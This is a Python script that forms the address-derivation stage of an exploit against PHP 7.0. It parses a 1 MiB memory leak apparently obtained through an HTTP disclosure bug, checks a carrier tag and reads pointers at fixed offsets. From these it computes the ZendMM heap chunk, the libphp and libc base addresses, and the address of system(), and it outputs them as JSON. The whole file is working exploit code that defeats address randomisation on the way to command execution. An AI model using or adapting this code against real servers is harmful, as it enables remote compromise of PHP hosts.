#!/usr/bin/env python3
"""Derive PHP 7.0 terminal addresses solely from the HTTP B1 disclosure."""

from __future__ import annotations

import argparse
import json
import pathlib
import struct


LEAK_LENGTH = 0x100000
MAIN_POINTER_OFFSET = 0xC8F30
MAIN_POINTER_DELTA = 0x12B200
DTOR_POINTER_OFFSET = 0x63EE8
ZVAL_PTR_DTOR_OFFSET = 0x46C790
LIBC_FROM_LIBPHP = 0x3A6F000
SYSTEM_FROM_LIBC = 0x3F480


def qword(data: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", data, offset)[0]


parser = argparse.ArgumentParser()
parser.add_argument("leak", type=pathlib.Path)
parser.add_argument("--output", type=pathlib.Path)
args = parser.parse_args()

data = args.leak.read_bytes()
if len(data) != LEAK_LENGTH:
    raise SystemExit(f"expected {LEAK_LENGTH:#x} bytes, got {len(data):#x}")
if not data.startswith(b"/04BBBBB"):
    raise SystemExit("unexpected PHP 7.0 B1 carrier tag")

main_pointer = qword(data, MAIN_POINTER_OFFSET)
main_chunk = main_pointer - MAIN_POINTER_DELTA
if main_chunk & 0x1FFFFF:
    raise SystemExit(f"derived main chunk is not 2 MiB aligned: {main_chunk:#x}")
if not (main_chunk <= main_pointer < main_chunk + 0x200000):
    raise SystemExit("main pointer lies outside the derived ZendMM chunk")

dtor_pointer = qword(data, DTOR_POINTER_OFFSET)
libphp_base = dtor_pointer - ZVAL_PTR_DTOR_OFFSET
if libphp_base & 0xFFF:
    raise SystemExit(f"derived libphp base is not page aligned: {libphp_base:#x}")
if not (0x0000700000000000 <= libphp_base < 0x0000800000000000):
    raise SystemExit(f"derived libphp base is not canonical: {libphp_base:#x}")

libc_base = libphp_base + LIBC_FROM_LIBPHP
system = libc_base + SYSTEM_FROM_LIBC
result = {
    "address_source": "http-b1",
    "leak_length": len(data),
    "carrier_tag": data[:8].decode("ascii"),
    "main_pointer_offset": hex(MAIN_POINTER_OFFSET),
    "main_pointer": hex(main_pointer),
    "main_chunk": hex(main_chunk),
    "dtor_pointer_offset": hex(DTOR_POINTER_OFFSET),
    "zval_ptr_dtor": hex(dtor_pointer),
    "libphp_base": hex(libphp_base),
    "libc_base": hex(libc_base),
    "system": hex(system),
    "constants": {
        "main_pointer_delta": hex(MAIN_POINTER_DELTA),
        "zval_ptr_dtor_offset": hex(ZVAL_PTR_DTOR_OFFSET),
        "libc_from_libphp": hex(LIBC_FROM_LIBPHP),
        "system_from_libc": hex(SYSTEM_FROM_LIBC),
    },
}
encoded = json.dumps(result, indent=2) + "\n"
if args.output:
    args.output.write_text(encoded, encoding="utf-8")
print(encoded, end="")
